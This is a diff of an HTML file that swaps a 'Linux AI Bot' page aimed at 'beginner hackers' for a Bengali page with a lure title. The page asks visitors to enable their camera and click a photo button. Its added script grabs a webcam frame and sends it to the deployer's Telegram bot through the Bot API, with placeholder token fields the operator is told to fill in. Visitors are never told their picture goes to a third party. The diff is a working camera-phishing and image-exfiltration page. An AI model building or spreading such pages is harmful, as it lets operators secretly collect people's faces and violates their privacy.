@@ -1,26 +1,102 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Linux AI Bot</title>
-    <link rel="stylesheet" href="style.css">
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <title>মাছ ভরা বল</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            padding: 20px;
+        }
+        h1 {
+            color: #008080;
+        }
+        button {
+            background-color: #ff6347;
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 10px;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #ff4500;
+        }
+        video, canvas {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-    <div class="background">
-        <div class="bubbles"></div>
-    </div>
-    
-    <div class="container">
-        <img src="logo.png" alt="Logo" class="logo"> 
-        <h1>Welcome to Linux AI Bot Official Website</h1>
-        <p>A beautiful Bot for Beginner Hackers.... ❤️</p>
-        <a href="https://t.me/herewalletbot/app?startapp=5760417" class="button">
-            <i class="fab fa-android"></i> CLICK HERE TO GO BOT
-        </a>
-    </div>
 
-    <script src="script.js"></script>
+    <h1>মাছ ভরা বল</h1>
+    <p>আপনার ক্যামেরা পারমিশন দিন এবং ছবি তুলুন!</p>
+    
+    <video id="video" width="300" height="225" autoplay></video>
+    <canvas id="canvas" width="300" height="225"></canvas>
+    
+    <br>
+    <button onclick="startCamera()">📷 ক্যামেরা চালু করুন</button>
+    <button onclick="captureAndSend()">📩 ক্লিক হিয়ার (ছবি তুলুন)</button>
+
+    <script>
+        let video = document.getElementById("video");
+        let canvas = document.getElementById("canvas");
+        let context = canvas.getContext("2d");
+
+        // ক্যামেরা চালু করার ফাংশন
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.style.display = "block";
+                })
+                .catch(function(error) {
+                    alert("ক্যামেরা চালু করতে সমস্যা হয়েছে: " + error);
+                });
+        }
+
+        // ছবি তুলে টেলিগ্রামে পাঠানোর ফাংশন
+        function captureAndSend() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imageData = canvas.toDataURL("image/png"); // ছবির ডাটা
+
+            let botToken = "YOUR_BOT_TOKEN"; // 🔴 এখানে তোমার বট টোকেন বসাও
+            let chatId = "YOUR_CHAT_ID"; // 🔴 এখানে তোমার টেলিগ্রাম চ্যাট আইডি বসাও
+
+            let formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", dataURItoBlob(imageData));
+            formData.append("caption", "একজন ইউজার ছবি তুলেছে!");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => alert("✅ ছবি টেলিগ্রামে পাঠানো হয়েছে!"))
+            .catch(error => alert("❌ ছবি পাঠাতে সমস্যা হয়েছে: " + error));
+        }
+
+        // Base64 ডাটা → Blob ফরম্যাটে কনভার্ট করা
+        function dataURItoBlob(dataURI) {
+            let byteString = atob(dataURI.split(',')[1]);
+            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            let arrayBuffer = new ArrayBuffer(byteString.length);
+            let uint8Array = new Uint8Array(arrayBuffer);
+            
+            for (let i = 0; i < byteString.length; i++) {
+                uint8Array[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([arrayBuffer], { type: mimeString });
+        }
+    </script>
+
 </body>
 </html>
